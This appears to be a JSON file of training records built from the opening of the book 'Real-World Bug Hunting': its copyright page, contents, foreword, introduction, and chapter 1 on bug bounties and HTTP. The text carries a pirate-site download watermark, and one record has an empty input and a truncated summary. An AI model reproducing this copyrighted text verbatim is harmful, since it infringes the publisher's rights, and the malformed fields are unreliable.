[
  {
    "input": "",
    "summary": "\"Real-",
    "output": "Download from www.finelybook.com 7450911@qq.com\nREAL-WORLD BUG\nHUNTING\nA Field Guide to Web Hacking\nby Peter Yaworski\nSan Francisco\n9\nDownload from www.finelybook.com 7450911@qq.com\nREAL-WORLD BUG HUNTING. Copyright © 2019 by Peter Yaworski.\nAll rights reserved. No part of this work may be reproduced or transmitted in any\nform or by any means, electronic or mechanical, including photocopying,\nrecording, or by any information storage or retrieval system, without the prior\nwritten permission of the copyright owner and the publisher.\nISBN-10: 1-59327-861-6\nISBN-13: 978-1-59327-861-8\nPublisher: William Pollock\nProduction Editor: Janelle Ludowise\nCover Illustration: Jonny Thomas\nInterior Design: Octopod Studios\nDevelopmental Editors: Jan Cash and Annie Choi\nTechnical Reviewer: Tsang Chi Hong\nCopyeditor: Anne Marie Walker\nCompositor: Happenstance Type-O-Rama\nProofreader: Paula L. Fleming\nIndexer: JoAnne Burek\nFor information on distribution, translations, or bulk sales, please contact No\nStarch Press, Inc. directly:\nNo Starch Press, Inc.\n245 8th Street, San Francisco, CA 94103\nphone: 1.415.863.9900; info@nostarch.com\nwww.nostarch.com\nLibrary of Congress Cataloging-in-Publication Data\nNames: Yaworski, Peter, author.\nTitle: Real-world bug hunting : a field guide to web hacking / Peter Yaworski.\nDescription: San Francisco : No Starch Press, 2019. | Includes\nbibliographical references.\nIdentifiers: LCCN 2018060556 (print) | LCCN 2019000034 (ebook) | ISBN\n10\nDownload from www.finelybook.com 7450911@qq.com\n9781593278625 (epub) | ISBN 1593278624 (epub) | ISBN 9781593278618\n(paperback) | ISBN 1593278616 (paperback)\nSubjects: LCSH: Debugging in computer science. | Penetration testing\n(Computer security) | Web sites--Testing. | BISAC: COMPUTERS / Security /\nViruses. | COMPUTERS / Security / General. | COMPUTERS / Networking /\nSecurity.\nClassification: LCC QA76.9.D43 (ebook) | LCC QA76.9.D43 Y39 2019 (print) |\nDDC 004.2/4--dc23\nLC record available at https://lccn.loc.gov/2018060556\nNo Starch Press and the No Starch Press logo are registered trademarks of No\nStarch Press, Inc. Other product and company names mentioned herein may be the\ntrademarks of their respective owners. Rather than use a trademark symbol with\nevery occurrence of a trademarked name, we are using the names only in an\neditorial fashion and to the benefit of the trademark owner, with no intention of\ninfringement of the trademark.\nThe information in this book is distributed on an “As Is” basis, without warranty.\nWhile every precaution has been taken in the preparation of this work, neither the\nauthor nor No Starch Press, Inc. shall have any liability to any person or entity\nwith respect to any loss or damage caused or alleged to be caused directly or\nindirectly by the information contained in it.\n11\nDownload from www.finelybook.com 7450911@qq.com\nAbout the Author\nPeter Yaworski is a self-taught hacker thanks to the generous\nknowledge sharing of so many hackers who came before him,\nincluding those referenced in this book. He is also a successful bug\nbounty hunter with thanks from Salesforce, Twitter, Airbnb, Verizon\nMedia, and the United States Department of Defense, among others.\nHe currently works at Shopify as an Application Security Engineer,\nhelping to make commerce more secure.\n12\nDownload from www.finelybook.com 7450911@qq.com\nAbout the Technical Reviewer\nTsang Chi Hong, also known as FileDescriptor, is a pentester and a\nbug bounty hunter. He lives in Hong Kong. He writes about web\nsecurity at https://blog.innerht.ml, enjoys listening to original\nsoundtracks, and owns some cryptocurrencies.\n13\nDownload from www.finelybook.com 7450911@qq.com\nBRIEF CONTENTS\nForeword by Michiel Prins and Jobert Abma\nAcknowledgments\nIntroduction\nChapter 1: Bug Bounty Basics\nChapter 2: Open Redirect\nChapter 3: HTTP Parameter Pollution\nChapter 4: Cross-Site Request Forgery\nChapter 5: HTML Injection and Content Spoofing\nChapter 6: Carriage Return Line Feed Injection\nChapter 7: Cross-Site Scripting\nChapter 8: Template Injection\nChapter 9: SQL Injection\nChapter 10: Server-Side Request Forgery\nChapter 11: XML External Entity\nChapter 12: Remote Code Execution\nChapter 13: Memory Vulnerabilities\nChapter 14: Subdomain Takeover\nChapter 15: Race Conditions\n14\nDownload from www.finelybook.com 7450911@qq.com\nChapter 16: Insecure Direct Object References\nChapter 17: OAuth Vulnerabilities\nChapter 18: Application Logic and Configuration Vulnerabilities\nChapter 19: Finding Your Own Bug Bounties\nChapter 20: Vulnerability Reports\nAppendix A: Tools\nAppendix B: Resources\nIndex\n15\nDownload from www.finelybook.com 7450911@qq.com\nCONTENTS IN DETAIL\nFOREWORD by Michiel Prins and Jobert Abma\nACKNOWLEDGMENTS\nINTRODUCTION\nWho Should Read This Book\nHow to Read This Book\nWhat’s in This Book\nA Disclaimer About Hacking\n1\nBUG BOUNTY BASICS\nVulnerabilities and Bug Bounties\nClient and Server\nWhat Happens When You Visit a Website\nStep 1: Extracting the Domain Name\nStep 2: Resolving an IP Address\nStep 3: Establishing a TCP Connection\nStep 4: Sending an HTTP Request\nStep 5: Server Response\nStep 6: Rendering the Response\nHTTP Requests\nRequest Methods\nHTTP Is Stateless\n16\nDownload from www.finelybook.com 7450911@qq.com\nSummary\n2\nOPEN REDIRECT\nHow Open Redirects Work\nShopify Theme Install Open Redirect\nTakeaways\nShopify Login Open Redirect\nTakeaways\nHackerOne Interstitial Redirect\nTakeaways\nSummary\n3\nHTTP PARAMETER POLLUTION\nServer-Side HPP\nClient-Side HPP\nHackerOne Social Sharing Buttons\nTakeaways\nTwitter Unsubscribe Notifications\nTakeaways\nTwitter Web Intents\nTakeaways\nSummary\n4\nCROSS-SITE REQUEST FORGERY\nAuthentication\n17\nDownload from www.finelybook.com 7450911@qq.com\nCSRF with GET Requests\nCSRF with POST Requests\nDefenses Against CSRF Attacks\nShopify Twitter Disconnect\nTakeaways\nChange Users Instacart Zones\nTakeaways\nBadoo Full Account Takeover\nTakeaways\nSummary\n5\nHTML INJECTION AND CONTENT SPOOFING\nCoinbase Comment Injection Through Character Encoding\nTakeaways\nHackerOne Unintended HTML Inclusion\nTakeaways\nHackerOne Unintended HTML Include Fix Bypass\nTakeaways\nWithin Security Content Spoofing\nTakeaways\nSummary\n6\nCARRIAGE RETURN LINE FEED INJECTION\nHTTP Request Smuggling\nv.shopify.com Response Splitting\nTakeaways\n18\nDownload from www.finelybook.com 7450911@qq.com\nTwitter HTTP Response Splitting\nTakeaways\nSummary\n7\nCROSS-SITE SCRIPTING\nTypes of XSS\nShopify Wholesale\nTakeaways\nShopify Currency Formatting\nTakeaways\nYahoo! Mail Stored XSS\nTakeaways\nGoogle Image Search\nTakeaways\nGoogle Tag Manager Stored XSS\nTakeaways\nUnited Airlines XSS\nTakeaways\nSummary\n8\nTEMPLATE INJECTION\nServer-Side Template Injections\nClient-Side Template Injections\nUber AngularJS Template Injection\nTakeaways\nUber Flask Jinja2 Template Injection\n19\nDownload from www.finelybook.com 7450911@qq.com\nTakeaways\nRails Dynamic Render\nTakeaways\nUnikrn Smarty Template Injection\nTakeaways\nSummary\n9\nSQL INJECTION\nSQL Databases\nCountermeasures Against SQLi\nYahoo! Sports Blind SQLi\nTakeaways\nUber Blind SQLi\nTakeaways\nDrupal SQLi\nTakeaways\nSummary\n10\nSERVER-SIDE REQUEST FORGERY\nDemonstrating the Impact of Server-Side Request Forgery\nInvoking GET vs. POST Requests\nPerforming Blind SSRFs\nAttacking Users with SSRF Responses\nESEA SSRF and Querying AWS Metadata\nTakeaways\nGoogle Internal DNS SSRF\n20\nDownload from www.finelybook.com 7450911@qq.com\nTakeaways\nInternal Port Scanning Using Webhooks\nTakeaways\nSummary\n11\nXML EXTERNAL ENTITY\neXtensible Markup Language\nDocument Type Definitions\nXML Entities\nHow XXE Attacks Work\nRead Access to Google\nTakeaways\nFacebook XXE with Microsoft Word\nTakeaways\nWikiloc XXE\nTakeaways\nSummary\n12\nREMOTE CODE EXECUTION\nExecuting Shell Commands\nExecuting Functions\nStrategies for Escalating Remote Code Execution\nPolyvore ImageMagick\nTakeaways\nAlgolia RCE on facebooksearch.algolia.com\nTakeaways\n21\nDownload from www.finelybook.com 7450911@qq.com\nRCE Through SSH\nTakeaways\nSummary\n13\nMEMORY VULNERABILITIES\nBuffer Overflows\nRead Out of Bounds\nPHP ftp_genlist() Integer Overflow\nTakeaways\nPython Hotshot Module\nTakeaways\nLibcurl Read Out of Bounds\nTakeaways\nSummary\n14\nSUBDOMAIN TAKEOVER\nUnderstanding Domain Names\nHow Subdomain Takeovers Work\nUbiquiti Subdomain Takeover\nTakeaways\nScan.me Pointing to Zendesk\nTakeaways\nShopify Windsor Subdomain Takeover\nTakeaways\nSnapchat Fastly Takeover\nTakeaways\n22\nDownload from www.finelybook.com 7450911@qq.com\nLegal Robot Takeover\nTakeaways\nUber SendGrid Mail Takeover\nTakeaways\nSummary\n15\nRACE CONDITIONS\nAccepting a HackerOne Invite Multiple Times\nTakeaways\nExceeding Keybase Invitation Limits\nTakeaways\nHackerOne Payments Race Condition\nTakeaways\nShopify Partners Race Condition\nTakeaways\nSummary\n16\nINSECURE DIRECT OBJECT REFERENCES\nFinding Simple IDORs\nFinding More Complex IDORs\nBinary.com Privilege Escalation\nTakeaways\nMoneybird App Creation\nTakeaways\nTwitter Mopub API Token Theft\nTakeaways\n23\nDownload from www.finelybook.com 7450911@qq.com\nACME Customer Information Disclosure\nTakeaways\nSummary\n17\nOAUTH VULNERABILITIES\nThe OAuth Workflow\nStealing Slack OAuth Tokens\nTakeaways\nPassing Authentication with Default Passwords\nTakeaways\nStealing Microsoft Login Tokens\nTakeaways\nSwiping Facebook Official Access Tokens\nTakeaways\nSummary\n18\nAPPLICATION LOGIC AND CONFIGURATION\nVULNERABILITIES\nBypassing Shopify Administrator Privileges\nTakeaways\nBypassing Twitter Account Protections\nTakeaways\nHackerOne Signal Manipulation\nTakeaways\nHackerOne Incorrect S3 Bucket Permissions\nTakeaways\n24\nDownload from www.finelybook.com 7450911@qq.com\nBypassing GitLab Two-Factor Authentication\nTakeaways\nYahoo! PHP Info Disclosure\nTakeaways\nHackerOne Hacktivity Voting\nTakeaways\nAccessing PornHub’s Memcache Installation\nTakeaways\nSummary\n19\nFINDING YOUR OWN BUG BOUNTIES\nReconnaissance\nSubdomain Enumeration\nPort Scanning\nScreenshotting\nContent Discovery\nPrevious Bugs\nTesting the Application\nThe Technology Stack\nFunctionality Mapping\nFinding Vulnerabilities\nGoing Further\nAutomating Your Work\nLooking at Mobile Apps\nIdentifying New Fuctionality\nTracking JavaScript Files\nPaying for Access to New Functionality\n25\nDownload from www.finelybook.com 7450911@qq.com\nLearning the Technology\nSummary\n20\nVULNERABILITY REPORTS\nRead the Policy\nInclude Details; Then Include More\nReconfirm the Vulnerability\nYour Reputation\nShow Respect for the Company\nAppealing Bounty Rewards\nSummary\nA\nTOOLS\nWeb Proxies\nSubdomain Enumeration\nDiscovery\nScreenshotting\nPort Scanning\nReconnaissance\nHacking Tools\nMobile\nBrowser Plug-Ins\nB\nRESOURCES\nOnline Training\n26\nDownload from www.finelybook.com 7450911@qq.com\nBug Bounty Platforms\nRecommended Reading\nVideo Resources\nRecommended Blogs\nINDEX\n27\nDownload from www.finelybook.com 7450911@qq.com\nFOREWORD\nThe best way to learn is simply by doing. That is how we learned to\nhack.\nWe were young. Like all hackers who came before us, and all of\nthose who will come after, we were driven by an uncontrollable,\nburning curiosity to understand how things worked. We were mostly\nplaying computer games, and by age 12 we decided to learn how to\nbuild software of our own. We learned how to program in Visual\nBasic and PHP from library books and practice.\nFrom our understanding of software development, we quickly\ndiscovered that these skills allowed us to find other developers’\nmistakes. We shifted from building to breaking, and hacking has been\nour passion ever since. To celebrate our high school graduation, we\ntook over a TV station’s broadcast channel to air an ad congratulating\nour graduating class. While amusing at the time, we quickly learned\nthere are consequences and these are not the kind of hackers the world\nneeds. The TV station and school were not amused and we spent the\nsummer washing windows as our punishment. In college, we turned\nour skills into a viable consulting business that, at its peak, had clients\nin the public and private sectors across the entire world. Our hacking\nexperience led us to HackerOne, a company we co-founded in 2012.\nWe wanted to allow every company in the universe to work with\nhackers successfully and this continues to be HackerOne’s mission\ntoday.\nIf you’re reading this, you also have the curiosity needed to be a\nhacker and bug hunter. We believe this book will be a tremendous\n28\nDownload from www.finelybook.com 7450911@qq.com\nguide along your journey. It’s filled with rich, real-world examples of\nsecurity vulnerability reports that resulted in real bug bounties, along\nwith helpful analysis and review by Pete Yaworski, the author and a\nfellow hacker. He is your companion as you learn, and that’s\ninvaluable.\nAnother reason this book is so important is that it focuses on how\nto become an ethical hacker. Mastering the art of hacking can be an\nextremely powerful skill that we hope will be used for good. The most\nsuccessful hackers know how to navigate the thin line between right\nand wrong while hacking. Many people can break things, and even try\nto make a quick buck doing so. But imagine you can make the internet\nsafer, work with amazing companies around the world, and even get\npaid along the way. Your talent has the potential of keeping billions of\npeople and their data secure. That is what we hope you aspire to.\nWe are grateful to no end to Pete for taking his time to document\nall of this so eloquently. We wish we had this resource when we were\ngetting started. Pete’s book is a joy to read and has the information\nneeded to kickstart your hacking journey.\nHappy reading, and happy hacking!\nRemember to hack responsibly.\nMichiel Prins and Jobert Abma\nCo-Founders, HackerOne\n29\nDownload from www.finelybook.com 7450911@qq.com\nACKNOWLEDGMENTS\nThis book wouldn’t be possible without the HackerOne community. I\nwant to thank HackerOne CEO Mårten Mickos, who reached out to\nme when I started working on this book, provided relentless feedback\nand ideas to make the book better, and even paid for the professionally\ndesigned cover of the self-published edition.\nI also want to thank HackerOne co-founders Michiel Prins and\nJobert Abma, who provided suggestions and contributed to some\nchapters when I was working on the early versions of this book. Jobert\nprovided an in-depth review, editing every chapter to provide\nfeedback and technical insights. His edits boosted my confidence and\ntaught me so much more than I ever realized was possible.\nIn addition, Adam Bacchus read the book five days after he joined\nHackerOne, provided edits, and explained how it felt to be on the\nreceiving end of vulnerability reports, which helped me develop\nChapter 19. HackerOne has never asked for anything in return. They\nonly wanted to support the hacking community by making this the\nbest book it could be.\nI would be remiss if I did not specifically thank Ben Sadeghipour,\nPatrik Fehrenbach, Frans Rosen, Philippe Harewood, Jason Haddix,\nArne Swinnen, FileDescriptor, and the many others who sat down\nwith me early on in my journey to chat about hacking, share their\nknowledge, and encourage me. Additionally, this book would not have\nbeen possible without hackers sharing their knowledge and disclosing\nbugs, especially those whose bugs I’ve referenced in this book. Thank\nyou all.\n30\nDownload from www.finelybook.com 7450911@qq.com\nLastly, I wouldn’t be where I am today if it were not for the love\nand support from my wife and two daughters. It was because of them\nthat I’ve been successful hacking and able to finish writing this book.\nAnd of course many thanks to the rest of my family, especially my\nparents who refused to buy Nintendo systems when I was growing up,\ninstead purchasing computers and telling me they were the future.\n31\nDownload from www.finelybook.com 7450911@qq.com\nINTRODUCTION\nThis book introduces you to the vast world of ethical hacking, or the\nprocess of responsibly discovering security vulnerabilities and\nreporting them to the application owner. When I first started learning\nabout hacking, I wanted to know not just what vulnerabilities hackers\nfound but how they found them.\nI searched for information but was always left with the same\nquestions:\nWhat vulnerabilities are hackers finding in applications?\nHow did hackers learn about those vulnerabilities found in applications?\nHow do hackers begin infiltrating a site?\nWhat does hacking look like? Is it all automated, or is it done manually?\nHow can I get started hacking and finding vulnerabilities?\nI eventually landed on HackerOne, a bug bounty platform designed\nto connect ethical hackers with companies looking for hackers to test\ntheir applications. HackerOne includes functionality that allows\nhackers and companies to disclose bugs that have been found and\nfixed.\nWhile reading through those disclosed HackerOne reports, I\n32\nDownload from www.finelybook.com 7450911@qq.com\nstruggled to understand what vulnerabilities people were finding and\nhow they could be abused. I often had to reread the same report two or\nthree times to understand it. I realized that I, and other beginners,\ncould benefit from plain-language explanations of real-world\nvulnerabilities.\nReal-World Bug Hunting is an authoritative reference that will help\nyou understand different types of web vulnerabilities. You’ll learn\nhow to find vulnerabilities, how to report them, how to get paid for\ndoing so, and, occasionally, how to write defensive code. But this\nbook doesn’t just cover successful examples: it also includes mistakes\nand lessons learned, many of them my own.\nBy the time you finish reading, you’ll have taken your first step\ntoward making the web a safer place, and you should be able to earn\nsome money doing it.\nWHO SHOULD READ THIS BOOK\nThis book is written with beginner hackers in mind. It doesn’t matter\nif you’re a web developer, a web designer, a stay-at-home parent, a\n10-year-old kid, or a 75-year-old retiree.\nThat said, although it’s not a prerequisite for hacking, some\nprogramming experience and a familiarity with web technologies can\nhelp. For example, you don’t have to be a web developer to be a\nhacker, but understanding the basic hypertext markup language\n(HTML) structure of a web page, how Cascading Style Sheets (CSS)\ndefine its look, and how JavaScript dynamically interacts with\nwebsites will help you discover vulnerabilities and recognize the\nimpact of the bugs you find.\nKnowing how to program is helpful when you’re looking for\n33\nDownload from www.finelybook.com 7450911@qq.com\nvulnerabilities involving an application’s logic and brainstorming how\na developer might make mistakes. If you can put yourself in the\nprogrammer’s shoes, guess how they’ve implemented something, or\nread their code (if available), you’ll have a higher chance of success.\nIf you want to learn about programming, No Starch Press has\nplenty of books to help you. You could also check out the free courses\non Udacity and Coursera. Appendix B lists additional resources.\nHOW TO READ THIS BOOK\nEach chapter that describes a vulnerability type has the following\nstructure:\n1. A description of the vulnerability type\n2. Examples of the vulnerability type\n3. A summary that provides conclusions\nEach vulnerability example includes the following:\nMy estimation of how difficult it is to find and prove the vulnerability\nThe URL associated with the location in which the vulnerability was\nfound\nA link to the original disclosure report or write-up\nThe date the vulnerability was reported\nThe amount the reporter earned for submitting the information\nA clear description of the vulnerability\nTakeaways that you can apply to your own hacking\nYou don’t need to read this book cover to cover. If there’s a\nparticular chapter you’re interested in, read it first. In some cases, I\n34\nDownload from www.finelybook.com 7450911@qq.com\nreference concepts discussed in previous chapters, but in doing so, I\ntry to note where I’ve defined the term so you can refer to relevant\nsections. Keep this book open while you hack.\nWHAT’S IN THIS BOOK\nHere’s an overview of what you’ll find in each chapter:\nChapter 1: Bug Bounty Basics explains what vulnerabilities and\nbug bounties are and the difference between clients and servers. It\nalso covers how the internet works, which includes HTTP\nrequests, responses, and methods and what it means to say HTTP\nis stateless.\nChapter 2: Open Redirect covers attacks that exploit the trust of\na given domain to redirect users to a different one.\nChapter 3: HTTP Parameter Pollution covers how attackers\nmanipulate HTTP requests, injecting additional parameters that the\nvulnerable target website trusts and that lead to unexpected\nbehavior.\nChapter 4: Cross-Site Request Forgery covers how an attacker\ncan use a malicious website to make a target’s browser send an\nHTTP request to another website. The other website then acts as\nthough the request is legitimate and sent intentionally by the\ntarget.\nChapter 5: HTML Injection and Content Spoofing explains\nhow malicious users inject HTML elements of their own design\ninto a targeted site’s web pages.\nChapter 6: Carriage Return Line Feed Injection shows how\nattackers inject encoded characters into HTTP messages to alter\n35\nDownload from www.finelybook.com 7450911@qq.com\nhow servers, proxies, and browsers interpret them.\nChapter 7: Cross-Site Scripting explains how attackers exploit a\nsite that doesn’t sanitize user input to execute their own JavaScript\ncode on the site.\nChapter 8: Template Injection explains how attackers exploit\ntemplate engines when a site doesn’t sanitize the user input it uses\nin its templates. The chapter includes client- and server-side\nexamples.\nChapter 9: SQL Injection describes how a vulnerability on a\ndatabase-backed site can allow an attacker to unexpectedly query\nor attack the site’s database.\nChapter 10: Server-Side Request Forgery explains how an\nattacker makes a server perform unintended network requests.\nChapter 11: XML External Entity shows how attackers exploit\nthe way an application parses XML input and processes the\ninclusion of external entities in its input.\nChapter 12: Remote Code Execution covers how attackers can\nexploit a server or application to run their own code.\nChapter 13: Memory Vulnerabilitites explains how attackers\nexploit an application’s memory management to cause unintended\nbehavior, including possibly executing the attacker’s own injected\ncommands.\nChapter 14: Subdomain Takeover shows how subdomain\ntakeovers occur when an attacker can control a subdomain on\nbehalf of a legitimate domain.\nChapter 15: Race Conditions reveals how attackers exploit\nsituations where a site’s processes race to complete based on an\n36\nDownload from www.finelybook.com 7450911@qq.com\ninitial condition that becomes invalid as the processes execute.\nChapter 16: Insecure Direct Object References covers\nvulnerabilities that occur when an attacker can access or modify a\nreference to an object, such as a file, database record, or account,\nto which they shouldn’t have access.\nChapter 17: OAuth Vulnerabilities covers bugs in the\nimplementation of the protocol designed to simplify and\nstandardize secure authorization on web, mobile, and desktop\napplications.\nChapter 18: Application Logic and Configuration\nVulnerabilities explains how an attacker can exploit a coding\nlogic or application configuration mistake to make the site perform\nsome unintended action that results in a vulnerability.\nChapter 19: Finding Your Own Bug Bounties gives tips on\nwhere and how to look for vulnerabilities based on my experience\nand methodology. This chapter is not a step-by-step guide to\nhacking a site.\nChapter 20: Vulnerability Reports discusses how to write\ncredible and informative vulnerability reports so programs won’t\nreject your bugs.\nAppendix A: Tools describes popular tools designed for hacking,\nincluding proxying web traffic, subdomain enumeration,\nscreenshotting, and more.\nAppendix B: Resources lists additional resources to further\nexpand your hacking knowledge. This includes online trainings,\npopular bounty platforms, recommended blogs, and so on.\n37\nDownload from www.finelybook.com 7450911@qq.com\nA DISCLAIMER ABOUT HACKING\nWhen you read about public vulnerability disclosures and see the\namount of money some hackers make, it’s natural to think that\nhacking is an easy and quick way to get rich. It isn’t. Hacking can be\nrewarding, but you’re less likely to find stories about the failures that\nhappen along the way (except in this book, where I share some very\nembarrassing stories). Because you’ll mostly hear about people’s\nhacking successes, you might develop unrealistic expectations of your\nown hacking journey.\nYou might find success very quickly. But if you’re having trouble\nfinding bugs, keep digging. Developers will always be writing new\ncode, and bugs will always make their way into production. The more\nyou try, the easier the process should become.\nOn that note, feel free to message me on Twitter @yaworsk and let\nme know how it’s going. Even if you’re unsuccessful, I’d like to hear\nfrom you. Bug hunting can be lonely work if you’re struggling. But\nit’s also awesome to celebrate with each other, and maybe you’ll find\nsomething I can include in the next edition of this book.\nGood luck and happy hacking.\n38\nDownload from www.finelybook.com 7450911@qq.com\n1\nBUG BOUNTY BASICS\nIf you’re new to hacking, it will help to have a basic understanding of\nhow the internet works and what happens under the hood when you\nenter a URL into a browser’s address bar. Although navigating to a\nwebsite might seem simple, it involves many hidden processes, such\nas preparing an HTTP request, identifying the domain to send the\nrequest to, translating the domain to an IP address, sending the\nrequest, rendering a response, and so on.\nIn this chapter, you’ll learn basic concepts and terminology, such\nas vulnerabilities, bug bounties, clients, servers, IP addresses, and\nHTTP. You’ll get a general understanding of how performing\nunintended actions and providing unexpected input or access to\nprivate information can result in vulnerabilities. Then, we’ll see what\nhappens when you enter a URL in your browser’s address bar,\nincluding what HTTP requests and responses look like and the various\nHTTP action verbs. We’ll end the chapter with an understanding of\nwhat it means to say HTTP is stateless.\n39"
  },
  {
    "input": "What is a bug bounty and how does it differ from a vulnerability disclosure program (VDP)?",
    "summary": "A vulnerability is a weakness in an application that allows unauthorized access or actions. Bug bounties are rewards given to ethical hackers who report such vulnerabilities. When visiting a website, a browser processes the URL by determining the domain, resolving it to an IP address, establishing a TCP connection, sending an HTTP request, receiving a server response, and rendering the content. The HTTP protocol is stateless, meaning each request is treated independently, and request methods define the actions clients can perform on servers.",
    "output": "Download from www.finelybook.com 7450911@qq.com\nVULNERABILITIES AND BUG BOUNTIES\nA vulnerability is a weakness in an application that allows a malicious\nperson to perform some unpermitted action or gain access to\ninformation they shouldn’t otherwise be allowed to access.\nAs you learn and test applications, keep in mind that vulnerabilities\ncan result from attackers performing intended and unintended actions.\nFor example, changing the ID of a record identifier to access\ninformation you shouldn’t have access to is an example of an\nunintended action.\nSuppose a website allowed you to create a profile with your name,\nemail, birthday, and address. It would keep your information private\nand share it only with your friends. But if the website allowed anyone\nto add you as a friend without your permission, this would be a\nvulnerability. Even though the site kept your information private from\nnon-friends, by allowing anyone to add you as a friend, anyone could\naccess your information. As you test a site, always consider how\nsomeone could abuse existing functionality.\nA bug bounty is a reward a website or company gives to anyone\nwho ethically discovers a vulnerability and reports it to that website or\ncompany. Rewards are often monetary and range from tens of dollars\nto tens of thousands of dollars. Other examples of bounties include\ncryptocurrencies, air miles, reward points, service credits, and so on.\nWhen a company offers bug bounties, it creates a program, a term\nthat we’ll use in this book to denote the rules and framework\nestablished by companies for people who want to test the company for\nvulnerabilities. Note that this is different from companies that operate\na vulnerability disclosure program (VDP). Bug bounties offer some\nmonetary reward, whereas a VDP does not offer payment (though a\n40\nDownload from www.finelybook.com 7450911@qq.com\ncompany may award swag). A VDP is just a way for ethical hackers to\nreport vulnerabilities to a company for that company to fix. Although\nnot all reports included in this book were rewarded, they’re all\nexamples from hackers participating in bug bounty programs.\nCLIENT AND SERVER\nYour browser relies on the internet, which is a network of computers\nthat send messages to each other. We call these messages packets.\nPackets include the data you’re sending and information about where\nthat data is coming from and where it’s going. Every computer on the\ninternet has an address for sending packets to it. But some computers\nonly accept certain types of packets, and others only allow packets\nfrom a restricted list of other computers. It’s then up to the receiving\ncomputer to determine what to do with the packets and how to\nrespond. For the purposes of this book, we’ll focus only on the data\nincluded in the packets (the HTTP messages), not the packets\nthemselves.\nI’ll refer to these computers as either clients or servers. The\ncomputer initiating requests is typically referred to as the client\nregardless of whether the request is initiated by a browser, command\nline, or so on. Servers refer to the websites and web applications\nreceiving the requests. If the concept is applicable to either clients or\nservers, I refer to computers in general.\nBecause the internet can include any number of computers talking\nto each other, we need guidelines for how computers should\ncommunicate over the internet. This takes the form of Request for\nComment (RFC) documents, which define standards for how\ncomputers should behave. For example, the Hypertext Transfer\n41\nDownload from www.finelybook.com 7450911@qq.com\nProtocol (HTTP) defines how your internet browser communicates\nwith a remote server using Internet Protocol (IP). In this scenario,\nboth the client and server must agree to implement the same standards\nso they can understand the packets each is sending and receiving.\nWHAT HAPPENS WHEN YOU VISIT A\nWEBSITE\nBecause we’ll focus on HTTP messages in this book, this section\nprovides you with a high-level overview of the process that occurs\nwhen you enter a URL in your browser’s address bar.\nStep 1: Extracting the Domain Name\nOnce you enter http://www.google.com/, your browser determines the\ndomain name from the URL. A domain name identifies which website\nyou’re trying to visit and must adhere to specific rules as defined by\nRFCs. For example, a domain name can only contain alphanumeric\ncharacters and underscores. An exception is internationalized domain\nnames, which are beyond the scope of this book. To learn more, refer\nto RFC 3490, which defines their usage. In this case, the domain is\nwww.google.com. The domain serves as one way to find the server’s\naddress.\nStep 2: Resolving an IP Address\nAfter determining the domain name, your browser uses IP to look up\nthe IP address associated with the domain. This process is referred to\nas resolving the IP address, and every domain on the internet must\nresolve to an IP address to work.\nTwo types of IP addresses exist: Internet Protocol version 4 (IPv4)\n42\nDownload from www.finelybook.com 7450911@qq.com\nand Internet Protocol version 6 (IPv6). IPv4 addresses are structured\nas four numbers connected by periods, and each number falls in a\nrange from 0 to 255. IPv6 is the newest version of the Internet\nProtocol. It was designed to address the problem of available IPv4\naddresses running out. IPv6 addresses are made up of eight groups of\nfour hexadecimal digits separated by colons, but methods exist to\nshorten IPv6 addresses. For example, 8.8.8.8 is an IPv4 address, and\n2001:4860:4860::8888 is a shortened IPv6 address.\nTo look up an IP address using just the domain name, your\ncomputer sends a request to Domain Name System (DNS) servers,\nwhich consist of specialized servers on the internet that have a registry\nof all domains and their matching IP addresses. The preceding IPv4\nand IPv6 addresses are Google DNS servers.\nIn this example, the DNS server you connect to would match\nwww.google.com to the IPv4 address 216.58.201.228 and send that\nback to your computer. To learn more about a site’s IP address, you\ncan use the command dig A site.com from your terminal and replace\nsite.com with the site you’re looking up.\nStep 3: Establishing a TCP Connection\nNext, the computer attempts to establish a Transmission Control\nProtocol (TCP) connection with the IP address on port 80 because you\nvisited a site using http://. The details of TCP aren’t important other\nthan to note that it’s another protocol that defines how computers\ncommunicate with each other. TCP provides two-way communication\nso that message recipients can verify the information they receive and\nnothing is lost in transmission.\nThe server you’re sending a request to might be running multiple\nservices (think of a service as a computer program), so it uses ports to\n43\nDownload from www.finelybook.com 7450911@qq.com\nidentify specific processes to receive requests. You can think of ports\nas a server’s doors to the internet. Without ports, services would have\nto compete for the information being sent to the same place. This\nmeans that we need another standard to define how services cooperate\nwith each other and ensure that the data for one service isn’t stolen by\nanother. For example, port 80 is the standard port for sending and\nreceiving unencrypted HTTP requests. Another common port is 443,\nwhich is used for encrypted HTTPS requests. Although port 80 is\nstandard for HTTP and 443 is standard for HTTPS, TCP\ncommunication can happen on any port, depending on how an\nadministrator configures an application.\nYou can establish your own TCP connection to a website on port\n80 by opening your terminal and running nc <IP ADDRESS> 80. This\nline uses the Netcat utility nc command to create a network connection\nfor reading and writing messages.\nStep 4: Sending an HTTP Request\nContinuing with http://www.google.com/ as an example, if the\nconnection in step 3 is successful, your browser should prepare and\nsend an HTTP request, as shown in Listing 1-1:\n➊ GET / HTTP/1.1\n➋ Host: www.google.com\n➌ Connection: keep-alive\n➍ Accept: application/html, */*\n➎ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\nListing 1-1: Sending an HTTP request\nThe browser makes a GET request to the / path ➊, which is the\n44\nDownload from www.finelybook.com 7450911@qq.com\nwebsite’s root. A website’s content is organized into paths, just like\nthe folders and files on your computer. As you get deeper into each\nfolder, the path you take is denoted by recording each folder’s name\nfollowed by a /. When you visit the first page of a website, you access\nthe root path, which is just a /. The browser also indicates it’s using\nthe HTTP version 1.1 protocol. A GET request just retrieves\ninformation. We’ll learn more about it later.\nThe host header ➋ holds an additional piece of information that is\nsent as part of the request. HTTP 1.1 needs it to identify where a\nserver at the given IP address should send the request because IP\naddresses can host multiple domains. A connection header ➌\nindicates the request to keep the connection with the server open to\navoid the overhead of constantly opening and closing connections.\nYou can see the expected response format at ➍. In this case, we’re\nexpecting application/html but will accept any format, as indicated by\nthe wildcard (*/*). There are hundreds of possible content types, but\nfor our purposes, you’ll see application/html, application/json,\napplication/octet-stream, and text/plain most often. Finally, the User-Agent\n➎ denotes the software responsible for sending the request.\nStep 5: Server Response\nIn response to our request, the server should respond with something\nthat looks like Listing 1-2:\n➊ HTTP/1.1 200 OK\n➋ Content-Type: text/html\n<html>\n<head>\n<title>Google.com</title>\n</head>\n<body>\n45\nDownload from www.finelybook.com 7450911@qq.com\n➌ --snip--\n</body>\n</html>\nListing 1-2: Server response\nHere, we’ve received an HTTP response with the status code 200\n➊ adhering to HTTP/1.1. The status code is 